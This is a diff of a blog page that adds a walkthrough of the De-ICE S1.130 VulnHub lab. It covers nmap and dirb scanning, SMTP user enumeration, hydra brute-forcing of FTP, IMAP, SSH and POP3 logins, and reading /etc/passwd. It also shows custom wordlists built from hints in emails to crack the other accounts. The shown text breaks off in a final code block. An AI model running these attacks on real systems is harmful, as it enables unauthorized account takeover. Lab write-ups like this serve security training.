@@ -9,7 +9,7 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: De-ICE: S1.120 Nmap output: 1
+  <meta name="description" content="Image: De-ICE: S1.130 Nmap output: 1
 2
 3
 4
@@ -17,9 +17,12 @@
 6
 7
 8
+9
+10
 PORT STATE SERVICE VERSION
-21/tcp open ftp ProFTPD 1.3.2
-22/tcp open ssh OpenSSH 5.1 (protocol 2.0 &hellip;">
+20/tcp closed ftp-data
+21/tcp open ftp vsftpd 2.0.4
+22/tcp open &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -88,6 +91,876 @@ PORT STATE SERVICE VERSION
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/14/de-ice-s1-dot-130/">DE-ICE-S1.130</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-14T15:34:52+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:34 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1130,11/">De-ICE: S1.130</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
+</span><span class='line'>20/tcp  closed ftp-data
+</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
+</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+</span><span class='line'>110/tcp open   pop3     Openwall popa3d
+</span><span class='line'>143/tcp open   imap     UW imapd 2004.357
+</span><span class='line'>443/tcp closed https
+</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dirb output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://192.168.1.20/ ----
+</span><span class='line'>+ http://192.168.1.20/cgi-bin/ (CODE:403|SIZE:296)
+</span><span class='line'>+ http://192.168.1.20/index.php (CODE:200|SIZE:1980)
+</span><span class='line'>+ http://192.168.1.20/index2.php (CODE:200|SIZE:563)
+</span><span class='line'>+ http://192.168.1.20/info.php (CODE:200|SIZE:37915)
+</span><span class='line'>+ http://192.168.1.20/~sysadmin (CODE:403|SIZE:416)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is nothing interesting for us except the sysadmin account.</p>
+
+<p>Web page mentions <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#99;&#117;&#115;&#x74;&#x6f;&#x6d;&#101;&#114;&#115;&#x65;&#114;&#x76;&#x69;&#99;&#101;&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#x6e;&#111;&#x73;&#x65;&#99;&#x62;&#97;&#x6e;&#107;&#x2e;&#x63;&#111;&#x6d;">&#99;&#x75;&#115;&#116;&#x6f;&#x6d;&#x65;&#x72;&#115;&#101;&#x72;&#118;&#x69;&#99;&#101;&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#110;&#111;&#x73;&#x65;&#x63;&#x62;&#97;&#110;&#x6b;&#x2e;&#99;&#x6f;&#x6d;</a> email address. After a
+little trying, we found out the user account that exists:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smtp-user-enum -M RCPT -t 192.168.1.20 -f root@slax.example.net -U -
+</span><span class='line'>csadmin
+</span><span class='line'>[CTRL+D]
+</span><span class='line'>
+</span><span class='line'>Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+</span><span class='line'>
+</span><span class='line'> ----------------------------------------------------------
+</span><span class='line'>|                   Scan Information                       |
+</span><span class='line'> ----------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>Mode ..................... RCPT
+</span><span class='line'>Worker Processes ......... 5
+</span><span class='line'>Usernames file ........... -
+</span><span class='line'>Target count ............. 1
+</span><span class='line'>Username count ........... 1
+</span><span class='line'>Target TCP port .......... 25
+</span><span class='line'>Query timeout ............ 5 secs
+</span><span class='line'>Target domain ............
+</span><span class='line'>
+</span><span class='line'>######## Scan started at Thu May  7 13:50:31 2015 #########
+</span><span class='line'>192.168.1.20: csadmin exists
+</span><span class='line'>######## Scan completed at Thu May  7 13:50:31 2015 #########
+</span><span class='line'>1 results.
+</span><span class='line'>
+</span><span class='line'>1 queries in 2 seconds (0.5 queries / sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We use hydra to crack user account successfully (ftp was the fastest way):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ftp -P /usr/share/ncrack/top50000.pwd -V
+</span><span class='line'>[21][ftp] host: 192.168.1.20   login: csadmin   password: rocker
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 imap -P /usr/share/ncrack/top50000.pwd -V
+</span><span class='line'>[143][imap] host: 192.168.1.20   login: csadmin   password: rocker
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ssh -P /usr/share/ncrack/top50000.pwd -V -t 4
+</span><span class='line'>[22][ssh] host: 192.168.1.20   login: csadmin   password: rocker
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 pop3 -P /usr/share/ncrack/top50000.pwd -V
+</span><span class='line'>[110][pop3] host: 192.168.1.20   login: csadmin   password: rocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in as csadmin / rocker:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat /etc/passwd
+</span><span class='line'>root:x:0:0::/root:/bin/bash
+</span><span class='line'>bin:x:1:1:bin:/bin:
+</span><span class='line'>daemon:x:2:2:daemon:/sbin:
+</span><span class='line'>adm:x:3:4:adm:/var/log:
+</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
+</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
+</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
+</span><span class='line'>mail:x:8:12:mail:/:
+</span><span class='line'>news:x:9:13:news:/usr/lib/news:
+</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
+</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
+</span><span class='line'>games:x:12:100:games:/usr/games:
+</span><span class='line'>ftp:x:14:50::/home/ftp:
+</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
+</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
+</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
+</span><span class='line'>sshd:x:33:33:sshd:/:
+</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+</span><span class='line'>pop:x:90:90:POP:/:
+</span><span class='line'>nobody:x:99:99:nobody:/:
+</span><span class='line'>sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
+</span><span class='line'>dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
+</span><span class='line'>sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
+</span><span class='line'>csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In home directory, there is a clue how to get sdadmin&rsquo;s password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat mailserv_download/2010122014234.j12Gqo4H049241 
+</span><span class='line'>To: csadmin@nosecbank.com
+</span><span class='line'>CC: 
+</span><span class='line'>Subject: My Son's Birthday
+</span><span class='line'>Date: Mon, 20 Dec 2010 14:23:46 +0500
+</span><span class='line'>Return-Path: &lt;sdadmin@nosecbank.com>
+</span><span class='line'>Delivered-To: csadmin:nosecbank.com@nosecbank.com
+</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000
+</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com; 
+</span><span class='line'>20 Dec 2010 09:23:46 -0000
+</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.34]) by 
+</span><span class='line'>srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for 
+</span><span class='line'>&lt;csadmin@nosecbank.com>; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)
+</span><span class='line'>Message-Id: &lt;2010122014234.j12Gqo4H049241@www.nosecbank.com>
+</span><span class='line'>Mime-Version: 1.0
+</span><span class='line'>Content-Type: multipart/alternative; 
+</span><span class='line'>boundary="---=_NextPart_000_0000_02F24S11.FEPQRE80"
+</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
+</span><span class='line'>Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==
+</span><span class='line'>Message: Hey Mark, I am curious if you would be free to come over and 
+</span><span class='line'>visit for my son Donovin's birthday tomorrow after work.  I would also 
+</span><span class='line'>appreciate if you brought Andy with you as well, because Donny 
+</span><span class='line'>really enjoyed playing with him last time he was over.  I know its short 
+</span><span class='line'>notice but he is turning 12 and it is special for both him and me. Let 
+</span><span class='line'>me know if this works. Thanks!  -Paul</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Also there is a secord part of some algorithm:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">csadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strings</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part2</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;([0-9][0-9].*)&quot;</span>
+</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">backLoop</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
+</span><span class='line'><span class="mi">25</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>   <span class="n">w</span>
+</span><span class='line'><span class="mi">26</span>      <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'><span class="mi">27</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
+</span><span class='line'><span class="mi">28</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span><span class='line'><span class="mi">29</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">%</span><span class="n">check</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);</span>
+</span><span class='line'><span class="mi">30</span>      <span class="k">else</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);}</span>        <span class="p">.</span>
+</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span>
+</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopProcess</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
+</span><span class='line'><span class="mi">46</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span><span class='line'><span class="mi">47</span>      <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">41</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
+</span><span class='line'><span class="mi">48</span>      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">45</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="p">;}</span>
+</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using this information, we was able to crack the password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..2000}; do echo donovin$i; echo Donovin$i; echo "$i"donovin; echo "$i"Donovin; done > wl
+</span><span class='line'>root@kali32:~# hydra -l sdadmin 192.168.1.20 ftp -P wl 
+</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span><span class='line'>
+</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:12:57
+</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 8000 login tries (l:1/p:8000), ~7 tries per task
+</span><span class='line'>[DATA] attacking service ftp on port 21
+</span><span class='line'>[21][ftp] host: 192.168.1.20   login: sdadmin   password: donovin1998
+</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
+</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:13:01</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in as sdadmin / donovin1998 and repeat the process:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">sdadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part3</span> <span class="o">|</span> <span class="n">strings</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;([0-9][0-9].*)&quot;</span>
+</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopBack</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
+</span><span class='line'><span class="mi">33</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
+</span><span class='line'><span class="mi">34</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="p">[</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">+</span><span class="n">ref</span><span class="p">];</span>
+</span><span class='line'><span class="mi">35</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="mi">36</span>      <span class="nf">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="p">(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span><span class='line'><span class="mi">37</span>      <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ch</span><span class="p">];</span> <span class="n">ch</span><span class="o">++</span><span class="p">;}</span>
+</span><span class='line'><span class="mi">38</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span><span class='line'><span class="mi">39</span>      <span class="k">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;=</span><span class="mi">33</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">33</span><span class="o">+</span><span class="p">(</span><span class="o">++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="mi">40</span>      <span class="k">else</span> <span class="nf">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;=</span><span class="mi">126</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">126</span><span class="o">-</span><span class="p">(</span><span class="o">--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="mi">41</span>      <span class="k">else</span><span class="p">{</span>
+</span><span class='line'><span class="mi">42</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="p">);</span>
+</span><span class='line'><span class="mi">43</span>      <span class="k">else</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="p">);}}</span>
+</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="p">;}</span> <span class="n">I</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sdadmin@slax:~$ cat mailserv_download/2010122015043.j15Htu1H341102 
+</span><span class='line'>To: sdadmin@nosecbank.com
+</span><span class='line'>CC: 
+</span><span class='line'>Subject: RE: My Son's Birthday
+</span><span class='line'>Date: Mon, 20 Dec 2010 15:04:32 +0500
+</span><span class='line'>Return-Path: &lt;csadmin@nosecbank.com>
+</span><span class='line'>Delived-To: sdadmin:nosecbank.com@nosecbank.com
+</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000
+</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com; 
+</span><span class='line'>20 Dec 2010 10:04:32 -0000
+</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.32]) by 
+</span><span class='line'>srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for 
+</span><span class='line'>&lt;csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)
+</span><span class='line'>Message-Id: &lt;2010122015043.j15Htu1H341102@www.nosecbank.com>
+</span><span class='line'>Mime-Version: 1.0
+</span><span class='line'>Content-Type: multipart/alternative; 
+</span><span class='line'>boundary="---=_NextPart_000_0000_05F11S20.FGHZWE49"
+</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
+</span><span class='line'>Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==
+</span><span class='line'>Message: Hey there Paul!  I would gladly bring myself and my son over 
+</span><span class='line'>tomorrow after work!  I would only be hesitant to come over if you 
+</span><span class='line'>invited Fred over too... He just freaks me out sometimes.  It doesnt 
+</span><span class='line'>help that he locks himself up in his office and is anti-social during 
+</span><span class='line'>lunch hours... On top of that he calls himself the "databaser"!  I mean, 
+</span><span class='line'>who in thier right mind does that?  Either way, I will most likely be 
+</span><span class='line'>there tomorrow.  I look forward to it!   -Mark</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the dbadmin&rsquo;s password could be related with the word databaser:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..9999}; do echo databaser$i; echo "$i"databaser; echo Databaser$i; echo "$i"Databaser; done > wl
+</span><span class='line'>root@kali32:~# hydra -l dbadmin 192.168.1.20 ftp -P wl 
+</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span><span class='line'>
+</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:21:55
+</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 39996 login tries (l:1/p:39996), ~39 tries per task
+</span><span class='line'>[DATA] attacking service ftp on port 21
+</span><span class='line'>[21][ftp] host: 192.168.1.20   login: dbadmin   password: databaser60
+</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
+</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:21:55</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We extract the last part of the email and put everything together:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
